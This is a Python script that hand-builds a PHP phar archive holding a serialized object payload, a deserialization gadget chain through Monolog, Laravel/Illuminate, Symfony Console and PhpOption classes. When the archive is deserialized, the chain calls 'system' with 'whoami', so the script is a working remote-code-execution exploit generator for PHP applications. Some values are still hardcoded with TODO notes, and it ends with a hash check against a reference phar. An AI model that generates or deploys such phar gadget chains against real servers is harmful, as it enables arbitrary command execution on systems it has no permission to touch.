import hashlib
import os


def generate_phar(payload, filename: str):
    file_basename = os.path.splitext(filename)[0].encode('utf-8')
    file_name = filename.encode('utf-8')
    filename_size = length_bytes(filename)
    file_size = int_bytes(4)              # TODO Where does this 4 bytes un/compressed file size come from? [Make dynamic]
    file_timestamp = b'\xBB\x56\x5B\x65'  # TODO Change to: round(time.time()).to_bytes(4, byteorder='little') [Make dynamic]
    file_checksum = b'\x0C\x7E\x7F\xD8'   # TODO Figure out how to get an CRC32 value that matches this [Make dynamic]
    files_flag = b'\xA4\x01\x00\x00'
    file_metadata = b''
    file_metadata_size = length_bytes(file_metadata)

    file_count = int_bytes(1)
    api_version = b'\x11\x00'
    global_flag = b'\x00\x00\x01\x00'
    alias = b''
    alias_size = length_bytes(alias)

    HEADER_INFO = file_count + api_version + global_flag + alias_size + alias
    PAYLOAD_SIZE = int_bytes(4 + len(payload) + 1) # payload + payload length bytes # TODO Why is it 1 higher than real size?
    FILE_REGISTER = filename_size + file_name + file_size + file_timestamp + file_size + file_checksum + files_flag + file_metadata_size + file_metadata + file_basename

    manifest_length = int_bytes(len(HEADER_INFO + PAYLOAD_SIZE + payload + FILE_REGISTER) + 1) # TODO Why is it 1 higher than real size?
    HEADER = b'<?php __HALT_COMPILER(); ?>\r\n' + manifest_length
    
    UNSIGNED_PHAR = HEADER + HEADER_INFO + PAYLOAD_SIZE + payload + FILE_REGISTER
    SIGNATURE_HASH = b'\x53\xE2\x43\x48\x99\x1F\x76\x26\x37\x11\x7D\x64\x81\xDA\xC8\x23\x50\xF8\xC6\x44' # TODO SHA-1 hash [Make dynamic]
    SIGNATURE_ID = b'\x02\x00\x00\x00GBMB' # SHA-1 Signature

    SIGNED_PHAR = UNSIGNED_PHAR + SIGNATURE_HASH + SIGNATURE_ID

    return SIGNED_PHAR


def length_bytes(value):
    return len(value).to_bytes(4, byteorder='little')


def int_bytes(value: int):
    return value.to_bytes(4, byteorder='little')


PAYLOAD = b'O:30:"Monolog\Handler\RollbarHandler":2:{s:42:"\x00Monolog\Handler\RollbarHandlerhasRecords";b:1;s:16:"\x00*\x00rollbarLogger";O:60:"Illuminate\Foundation\Support\Providers\RouteServiceProvider":1:{s:6:"\x00*\x00app";O:23:"Illuminate\View\Factory":1:{s:9:"\x00*\x00finder";O:37:"\x00Symfony\Component\Console\Application":3:{s:50:"\x00Symfony\Component\Console\Applicationinitialized";b:1;s:47:"\x00Symfony\Component\Console\Applicationcommands";a:1:{i:0;O:33:"Illuminate\Foundation\AliasLoader":1:{s:10:"\x00*\x00aliases";a:1:{i:0;s:3:"key";}}}s:52:"\x00Symfony\Component\Console\ApplicationcommandLoader";O:27:"Illuminate\Cache\Repository":1:{s:8:"\x00*\x00store";O:20:"\x00PhpOption\LazyOption":3:{s:28:"\x00PhpOption\LazyOptionoption";N;s:30:"\x00PhpOption\LazyOptioncallback";s:6:"system";s:31:"\x00PhpOption\LazyOptionarguments";a:1:{i:0;s:6:"whoami";}}}}}}}'
phar = generate_phar(PAYLOAD, "test.txt")
hash = hashlib.sha512(phar).digest().hex()


if hash != "df5380de953af92c3ea675dd3041f9e771313a23da02756dd1a04b091483afd1d79eea9b268206c2568130897132f9d48569970a617a911f34b307a79f6c0ada":
    print("[!] Failed to recreate phar file")
else:
    print("[âˆš] Gegenerated an 1:1 copy of the phar file")